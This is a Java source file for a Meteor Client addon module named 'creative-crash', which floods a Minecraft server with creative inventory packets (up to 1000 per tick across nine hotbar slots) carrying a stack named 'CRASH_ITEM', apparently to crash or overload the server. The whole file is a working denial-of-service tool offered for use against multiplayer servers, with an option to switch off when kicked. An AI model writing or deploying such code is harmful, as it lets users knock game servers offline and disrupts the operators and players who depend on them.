package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import widecat.meteorcrashaddon.CrashAddon;

public class CreativeCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.").defaultValue(100).min(1).sliderMax(1000).build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disables on kick.").defaultValue(true).build());

    public CreativeCrash() {
        super(CrashAddon.CATEGORY, "creative-crash", "Spams creative inventory packets.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (!mc.player.getAbilities().creativeMode) {
            error("You must be in creative mode.");
            return;
        }

        // YENİ: Data Components ile item oluştur
        ItemStack crashItem = new ItemStack(Items.STONE, 64);
        crashItem.set(DataComponentTypes.ITEM_NAME, net.minecraft.text.Text.literal("CRASH_ITEM"));
        
        for (int i = 0; i < amount.get(); i++) {
            for (int slot = 0; slot < 9; slot++) {
                mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(slot, crashItem));
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}